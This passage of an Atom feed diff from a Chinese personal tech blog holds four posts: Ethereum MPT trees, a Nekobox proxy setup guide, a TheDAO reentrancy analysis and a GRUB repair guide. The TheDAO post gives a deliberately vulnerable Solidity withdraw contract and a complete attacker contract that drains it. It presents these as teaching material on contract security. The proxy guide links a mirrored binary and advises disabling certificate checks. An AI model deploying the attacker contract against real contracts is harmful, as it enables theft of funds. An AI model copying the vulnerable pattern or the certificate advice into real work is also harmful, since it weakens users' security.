+    <link href="https://bighu630.github.io/2024/09/02/MPT%E7%B3%BB%E5%88%971/"/>
+    <id>https://bighu630.github.io/2024/09/02/MPT%E7%B3%BB%E5%88%971/</id>
+    <published>2024-09-02T06:05:14.000Z</published>
+    <updated>2024-09-23T11:34:16.269Z</updated>
+    
+    <content type="html"><![CDATA[<blockquote><p>本博客探讨了以太坊为何使用MPT树及其在世界状态中的恢复机制，并解释了合约数据删除对MPT树负担的影响，强调了MPT树如何通过更新与回滚机制保障以太坊的状态管理。</p></blockquote><h2 id="为什么以太坊要用MPT数"><a href="#为什么以太坊要用MPT数" class="headerlink" title="为什么以太坊要用MPT数"></a>为什么以太坊要用MPT数</h2><p>1,mpt树优于hash表，在区块连网络中，需要确认世界状态相同 ，hash表需要校验所有的hash</p><p>2.使用序列表会导致插入过程麻烦，插入一条数据，整个链路都要更新</p><h2 id="MPT树是如何恢复的？（世界状态中的mpt树"><a href="#MPT树是如何恢复的？（世界状态中的mpt树" class="headerlink" title="MPT树是如何恢复的？（世界状态中的mpt树)"></a>MPT树是如何恢复的？（世界状态中的mpt树)</h2><p>mpt树的恢复与mpt树的更新是有关系的，在以太坊的生命周期中，世界状态的mpt树是根据更新的方式来改变状态的，具体而言，无论是对树做增删改，最后在数据库中都是插入一个新的key,然后根据这个新的key去更新路径上所有的key(更新的过程也是新建key然后插入进去，老key不会丢失)</p><p><img src="/home/ivhu/.config/Typora/typora-user-images/image-20240906111324142.png" class="lazyload" data-srcset="/home/ivhu/.config/Typora/typora-user-images/image-20240906111324142.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="MTP结构"></p><p>根据节点的key-v我们可以知道，树的构建是由下而上的，因为父节点在存储是依赖前一节点的hash,当然分支节点中是在各个分支中写入hash,所以分支节点中包含大量的hash。那么当整个实际状态更新时:</p><p>例如node3发生了改变，并不会改变node3此刻对应的key-v ，而是会新建一个node,然后更新node2,node1,使得整个世界状态指向新产生的node3.</p><p>那么这样操作之后，当我们需要回滚时，我们只需要知道在需要回滚的位置的根状态hash,那么整个世界状态就可以根据这个过去的roothash,找回历史装状态，对于上面的例子而言，老的roothash最后会引导你找到老的node3 你将拿到node3被修改之前的状态。</p><p>这也是为什么 世界状态可以根据roothash恢复。</p><h2 id="合约中删除数据可以减轻合约MPT树的负担吗？"><a href="#合约中删除数据可以减轻合约MPT树的负担吗？" class="headerlink" title="合约中删除数据可以减轻合约MPT树的负担吗？"></a>合约中删除数据可以减轻合约MPT树的负担吗？</h2><p>那么回味一下，世界状态能根据roothash恢复的关键是每一次世界状态的更新，以太坊都会把新状态落盘到数据库里面去.</p><p>那么对于合约的mpt树，实际上是不影响的，也就是如果我们把合约中的数据进行删除的确会减少mpt树的负担，因为删除的过程实际上会减少mpt树的树枝，并且改变了mpt树的结构。</p><p>但是删除合约中的数据并不会减轻以太坊的存储容量，合约中的所有数据都是一直保存的，删除只是在更新之后mpt数不指向被删除的数据.</p><p>可以参考一下这里对mpt树的删除操作：<a href="https://learnblockchain.cn/article/319">https://learnblockchain.cn/article/319</a></p><p>树的结构确实会变简化。</p>]]></content>
+    
+    
+    <summary type="html">本博客探讨了以太坊为何使用MPT树及其在世界状态中的恢复机制，并解释了合约数据删除对MPT树负担的影响，强调了MPT树如何通过更新与回滚机制保障以太坊的状态管理。</summary>
+    
+    
+    
+    <category term="区块链" scheme="https://bighu630.github.io/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
+    
+    <category term="以太坊" scheme="https://bighu630.github.io/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/%E4%BB%A5%E5%A4%AA%E5%9D%8A/"/>
+    
+    
+    <category term="MPT" scheme="https://bighu630.github.io/tags/MPT/"/>
+    
+    <category term="以太坊" scheme="https://bighu630.github.io/tags/%E4%BB%A5%E5%A4%AA%E5%9D%8A/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>windows使用nekobox翻墙</title>
+    <link href="https://bighu630.github.io/2024/09/02/how-to-use-nekobox-in-windows/"/>
+    <id>https://bighu630.github.io/2024/09/02/how-to-use-nekobox-in-windows/</id>
+    <published>2024-09-02T02:39:47.000Z</published>
+    <updated>2024-09-23T11:34:16.270Z</updated>
+    
+    <content type="html"><![CDATA[<blockquote><p>这篇博客提供了如何在国内环境中安装和使用 Nekobox 客户端的详细指南。步骤包括：安装：提供了一个下载链接并指导如何解压和找到软件本体。使用：描述了如何设置以优化网络速度，包括选择绕过局域网和大陆的选项。翻墙链接导入：讲解了如何导入翻墙链接并启动。开启系统代理：指示如何启用系统代理并避免选择错误的模式。解决无法上网的问题：提供了针对无法上网的故障排除步骤，包括调整证书检查设置。整体来说，博客旨在帮助用户在国内网络环境下顺利安装和配置 Nekobox，以实现网络翻墙。</p></blockquote><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>由于github国内可能访问不到，这里我把客户端要用的软件下载下来了:</p><p><a href="https://ww0.lanzouq.com/ifg4V270qwib">https://ww0.lanzouq.com/ifg4V270qwib</a></p><p>下载之后是一个zip压缩包，将压缩包解压后就是软件本体</p><p><img src="https://pic.imgdb.cn/item/66da73bad9c307b7e9c6ecf4.png" class="lazyload" data-srcset="https://pic.imgdb.cn/item/66da73bad9c307b7e9c6ecf4.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="Imgur"></p><p>软件本体叫nekobox,在文件夹里面找到它，双击打开（你可能会找到两个，其中一个是图片，如果你碰巧打开了图片，不用管它，去找另外一个）</p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>打开后长这个样子</p><p><img src="https://pic.imgdb.cn/item/66da73ccd9c307b7e9c6fa5f.png" class="lazyload" data-srcset="https://pic.imgdb.cn/item/66da73ccd9c307b7e9c6fa5f.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="open nekobox"></p><p>在使用前我们先进行一点设置（这样可以加速网速）</p><ul><li>打开首选项里面的路由设置</li></ul><p><img src="https://pic.imgdb.cn/item/66da73e3d9c307b7e9c71126.png" class="lazyload" data-srcset="https://pic.imgdb.cn/item/66da73e3d9c307b7e9c71126.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="nekobox setting"></p><ul><li>在简易路由中 预设里面 选择“绕过局域网和大陆 然后点确定</li></ul><p><img src="https://pic.imgdb.cn/item/66da73efd9c307b7e9c71a7b.png" class="lazyload" data-srcset="https://pic.imgdb.cn/item/66da73efd9c307b7e9c71a7b.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="router"></p><p>回到最开始的地方，将翻墙链接导入进来</p><p>简单的方法：拿到我给出来的 以trojan&#x2F;vmess&#x2F;ss 这些开头的链接</p><p>在我鼠标所在的位置右键，选择从剪贴板导入（注意你要先复制）</p><p><img src="https://pic.imgdb.cn/item/66da73fdd9c307b7e9c726d2.png" class="lazyload" data-srcset="https://pic.imgdb.cn/item/66da73fdd9c307b7e9c726d2.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="node setting"></p><p>这时候会在这里新增一条记录</p><p>右键这条记录 -&gt; 启动</p><h2 id="开启系统代理"><a href="#开启系统代理" class="headerlink" title="开启系统代理"></a>开启系统代理</h2><p>启动之后你可能还不能用，这时候就需要开启系统代理</p><p>把这里勾上，注意一定不要勾上面的 Tun模式</p><p><img src="https://pic.imgdb.cn/item/66da740bd9c307b7e9c73148.png" class="lazyload" data-srcset="https://pic.imgdb.cn/item/66da740bd9c307b7e9c73148.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="system proxy"></p><h2 id="解决无法上网"><a href="#解决无法上网" class="headerlink" title="解决无法上网"></a>解决无法上网</h2><p>如果还是有问题，可能可以试试下面的操作</p><p>双击有问题的记录（不要问我什么是记录，你启动的时候右键的那个），这会打开他的编辑页面</p><p>找到这里的不检查证书服务器，把这里勾上 然后点确认，再次启动试试</p><p><img src="https://pic.imgdb.cn/item/66da7419d9c307b7e9c73bf9.png" class="lazyload" data-srcset="https://pic.imgdb.cn/item/66da7419d9c307b7e9c73bf9.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="problem fix"></p><p>如果还有问题，那就在看啦。</p>]]></content>
+    
+    
+    <summary type="html">这篇博客提供了如何在国内环境中安装和使用 Nekobox 客户端的详细指南。步骤包括：安装：提供了一个下载链接并指导如何解压和找到软件本体。使用：描述了如何设置以优化网络速度，包括选择绕过局域网和大陆的选项。翻墙链接导入：讲解了如何导入翻墙链接并启动。开启系统代理：指示如何启用系统代理并避免选择错误的模式。解决无法上网的问题：提供了针对无法上网的故障排除步骤，包括调整证书检查设置。整体来说，博客旨在帮助用户在国内网络环境下顺利安装和配置 Nekobox，以实现网络翻墙。</summary>
+    
+    
+    
+    <category term="教程" scheme="https://bighu630.github.io/categories/%E6%95%99%E7%A8%8B/"/>
+    
+    <category term="科学上网" scheme="https://bighu630.github.io/categories/%E6%95%99%E7%A8%8B/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/"/>
+    
+    
+    <category term="教程" scheme="https://bighu630.github.io/tags/%E6%95%99%E7%A8%8B/"/>
+    
+    <category term="科学上网" scheme="https://bighu630.github.io/tags/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>tho dao 合约漏洞</title>
+    <link href="https://bighu630.github.io/2024/07/30/tho-dao-backdoor/"/>
+    <id>https://bighu630.github.io/2024/07/30/tho-dao-backdoor/</id>
+    <published>2024-07-30T05:43:23.000Z</published>
+    <updated>2024-09-23T11:34:16.270Z</updated>
+    
+    <content type="html"><![CDATA[<blockquote><p>这篇博客分析了TheDAO漏洞的机制，阐明了如何利用Solidity合约的特性进行攻击，具体展示了黑客合约如何通过重入攻击提取TheDAO合约中存储的以太坊，强调了在合约中处理资金转账和状态更新时需要遵循的安全原则。</p></blockquote><h2 id="什么是-TheDao-漏洞？"><a href="#什么是-TheDao-漏洞？" class="headerlink" title="什么是 TheDao 漏洞？"></a>什么是 TheDao 漏洞？</h2><p>简单来讲，thedao 漏洞允许黑客将 thedao 合约中储存的 eth 全部取走。</p><p>那么什么是合约之中的 eth 呢？</p><p>solidity 允许合约定义 payable 方法来接受 eth. 当用户调用带有 payable 关键字的合约方法时，如果<code>msg.value</code>不为 0,则将<code>msg.value</code>转移到合约账下。</p><p>由于 thedao 是一个面对所有人的合约，而他的业务逻辑也需要用户将 eth 转移到他的合约里面。</p><p>那么正常情况下 thedao 合约中有大量的 eth,来自于不同人的转账，一般而言合约会使用一个 mapping 来记录每个地址有多要 eth 在这里面。</p><h2 id="solidity-特性"><a href="#solidity-特性" class="headerlink" title="solidity 特性"></a>solidity 特性</h2><p>如果我们向一个合约转账，这里的转账不是使用合约调用的方式，而是像普通转账一样，calldata 为空。</p><p>这时合约会自动调用 receive 方法（如果有的话），这将允许合约在收到转账后进行一些操作。</p><h3 id="什么是先转账后记账"><a href="#什么是先转账后记账" class="headerlink" title="什么是先转账后记账"></a>什么是先转账后记账</h3><p>在合约中我们可以使用 transfer,send 等方法将合约中一定数量的 eth 转移到对应的账户中，当然这里的转账对象也可以是另一个合约。</p><p>而记账的意思是，由于我们所有的 eth 都是放合约里面，没有区分那个 eth 是谁的，具体的记录一般在合约中用 mapping 记录，那么在合约中，每次我们进行转账时，都应该修改我们维护的账本（也就是那个 mapping）。先转账后记账的意思就是，先使用 transfor,send,call 等方法转账，而后更新 mapping 中的数据。在合约中表现为转账的操作在修改 mapping 的操作前面。</p><p>eg：</p><pre><code class="solidity">    (bool sent, ) = msg.sender.call&#123;value: bal&#125;(&quot;&quot;);  // 先转账    require(sent, &quot;Failed to withdraw sender&#39;s balance&quot;);    // Update user&#39;s balance.    balances[msg.sender] = balances[msg.sender] - bal;  // 后修改mapping中的数据</code></pre><p>那么回到 solidity 的特性，在转账时，接受者合约可以定义<code>recevie</code>方法，在转账发生时进行相关操作。</p><h2 id="漏洞的利用"><a href="#漏洞的利用" class="headerlink" title="漏洞的利用"></a>漏洞的利用</h2><ul><li><p>当我们调用 theDao 中转账函数时，合约会向<code>msg.sender</code>转账.</p></li><li><p><code>msg.sender</code>是黑客的合约，当 theDao 向黑客的合约转账时，会调用黑客合约中的 recevie 方法.</p></li><li><p>由于 evm 是单线程的，所以后面修改 mapping 的操作还不会进行，而黑客的 recevie 方法则再次调用 thedao 中的转账合约.</p></li><li><p>由于 thedao 合约还没有修改账本，所以 thedao 合约还是认为黑客合约还可以提款，而当进行到提款操作时又会进入到黑客合约的<code>recevie</code>方法.</p></li></ul><p>如此循环，直到达到黑客<code>recevie</code>中设置的阈值。</p><p><strong>案例合约：</strong></p><pre><code class="solidity">// SPDX-License-Identifier: MITpragma solidity ^0.8.10;contract Dao &#123;mapping(address =&gt; uint256) public balances;    function deposit() public payable &#123;        require(msg.value &gt;= 1 ether, &quot;Deposits must be no less than 1 Ether&quot;);        balances[msg.sender] += msg.value;    &#125;    function withdraw() public &#123;        // Check user&#39;s balance        require(            balances[msg.sender] &gt;= 1 ether,            &quot;Insufficient funds.  Cannot withdraw&quot;        );        uint256 bal = balances[msg.sender];        // Withdraw user&#39;s balance        // payable(msg.sender).transfer(bal);  // transfer只能向eoa发送交易        (bool sent, ) = msg.sender.call&#123;value: bal&#125;(&quot;&quot;);  // call  eoa和合约都可以发送        require(sent, &quot;Failed to withdraw sender&#39;s balance&quot;);        // Update user&#39;s balance.        balances[msg.sender] = balances[msg.sender] - bal;        require(balances[msg.sender]&gt;=0,&quot;balances &lt; 0&quot;);    &#125;    function daoBalance() public view returns (uint256) &#123;        return address(this).balance;    &#125;&#125;</code></pre><p><strong>黑客合约：</strong></p><pre><code class="solidity">// SPDX-License-Identifier: MITpragma solidity ^0.8.10;interface IDao &#123;    function withdraw() external ;    function deposit()external  payable; &#125;contract Hacker&#123;    IDao dao;    address payable hacker;    constructor(address _dao)&#123;        dao = IDao(_dao);        hacker = payable(msg.sender);    &#125;    function attack() public payable &#123;        // Seed the Dao with at least 1 Ether.        require(msg.value &gt;= 1 ether, &quot;Need at least 1 ether to commence attack.&quot;);        dao.deposit&#123;value: msg.value&#125;();        // Withdraw from Dao.        dao.withdraw();    &#125;    fallback() external payable&#123;        if(address(dao).balance &gt;= 1 ether)&#123;            dao.withdraw();        &#125;    &#125;    receive() external payable &#123;        if(address(dao).balance &gt;= 1 ether)&#123;            dao.withdraw();        &#125;    &#125;    function getBalance()public view returns (uint)&#123;        return address(this).balance;    &#125;    function getAllETH()public &#123;        hacker.transfer(address(this).balance);    &#125;&#125;</code></pre>]]></content>
+    
+    
+    <summary type="html">这篇博客分析了TheDAO漏洞的机制，阐明了如何利用Solidity合约的特性进行攻击，具体展示了黑客合约如何通过重入攻击提取TheDAO合约中存储的以太坊，强调了在合约中处理资金转账和状态更新时需要遵循的安全原则。</summary>
+    
+    
+    
+    <category term="区块链" scheme="https://bighu630.github.io/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
+    
+    <category term="以太坊" scheme="https://bighu630.github.io/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/%E4%BB%A5%E5%A4%AA%E5%9D%8A/"/>
+    
+    
+    <category term="solidity" scheme="https://bighu630.github.io/tags/solidity/"/>
+    
+    <category term="合约安全" scheme="https://bighu630.github.io/tags/%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Linux通用grub急救</title>
+    <link href="https://bighu630.github.io/2024/07/03/Linux%E9%80%9A%E7%94%A8grub%E6%80%A5%E6%95%91/"/>
+    <id>https://bighu630.github.io/2024/07/03/Linux%E9%80%9A%E7%94%A8grub%E6%80%A5%E6%95%91/</id>
+    <published>2024-07-03T11:41:39.000Z</published>
+    <updated>2024-09-23T11:34:16.269Z</updated>
+    
+    <content type="html"><![CDATA[<blockquote><p>在这篇博客中，作者介绍了在折腾Linux的GRUB引导时常遇到的问题，并提出了解决方案，特别是当GRUB因分区表修改或Windows升级而出现问题时，如何修复GRUB引导。通过分享Windows与Linux共存环境下可能出现的分区表错位问题，作者提供了一个简单有效的解决思路：重新安装GRUB并使用grub-mkconfig生成新的GRUB配置。同时，文章还强调了使用Arch启动盘和手动挂载分区来解决问题的过程。</p></blockquote><p>对于刚接触linux的小白，我们有无数种可能去把我们的grub引导给折腾坏，可能只是因为默认的grub太丑，或者其他手欠的原因。总之我们都是按照网上的教程（加一点点我们自己的理解）然后grub就给我一个 “&gt;” 了。</p><p><strong>把grub弄坏，你是故意的还是不小心的？</strong></p><p>要是不小心的话，有可能你的grub引导还在，只是他找不到硬盘了。</p><p>通常来说大概率（系统会帮）我们把grub放在硬盘分区的前面，这样即使我们后面手欠向改一改分区，也不会影响到前面的分区。但是也有一种情况，我们使用的是双系统，虽然我也不用windows，但是偶尔进去看到它要升级，然后我grub就挂了。</p><p>实际上是这么回事儿，windows,和linux安装在一个硬盘上，windows分区在前面。windos做大版本升级的时候，有可能他会改分区表（我已经踩两次了，一次win10升win11,一次win11升级，就在我写这个博客的时候）。如果是这样，你有可能通过我之前写的一篇博客恢复<a href="https://www.cnblogs.com/bighuyspa/p/15416476.html">https://www.cnblogs.com/bighuyspa/p/15416476.html</a></p><p>使用上面方法修复grub的原理是，因为硬盘分区错位导致的grub分区找不到。</p><p>上面的教程是我用kali的时候的，我不确定是否每次都能这样干，反正最近的这次事故我没用这种方法解决，可能是我用的arch是我自己设置的grub,并且arch需要使用efi，结果我efi分区挂不上去。</p><p>下面是我理解的，几乎100%解决grub引导问题。</p><p>思路其实很简单，我们只需要重新安装一下grub,然后用grub-mkconfig重新生成一下grub配置就可以。</p><ul><li><p>第一步：弄个arch的启动盘（家中常备arch启动盘，这很正常吧。）</p></li><li><p>第二步：然后去dev下面找找你系统在那个分区上，具体你可以百度搜索linux查看硬盘分区详情，然后看看大小，这个就看你跟你linux的感情了，能不能一次找到。然后随便找个文件夹给他挂上去。</p></li></ul><p>挂上去之后，你可以看看里面的boot&#x2F; 和 boot&#x2F;grub 下面有没有很多东西，当然可能还要把你的efi分区挂载到这个boot文件夹里面。</p>]]></content>
+    
+    
+    <summary type="html">在这篇博客中，作者介绍了在折腾Linux的GRUB引导时常遇到的问题，并提出了解决方案，特别是当GRUB因分区表修改或Windows升级而出现问题时，如何修复GRUB引导。通过分享Windows与Linux共存环境下可能出现的分区表错位问题，作者提供了一个简单有效的解决思路：重新安装GRUB并使用grub-mkconfig生成新的GRUB配置。同时，文章还强调了使用Arch启动盘和手动挂载分区来解决问题的过程。</summary>
+    
+    
+    
+    <category term="计算机" scheme="https://bighu630.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/"/>
+    
+    <category term="linux" scheme="https://bighu630.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/linux/"/>
+    
+    
+    <category term="linux" scheme="https://bighu630.github.io/tags/linux/"/>
+    
+    <category term="grub" scheme="https://bighu630.github.io/tags/grub/"/>
+    
+  </entry>
+  
+</feed>
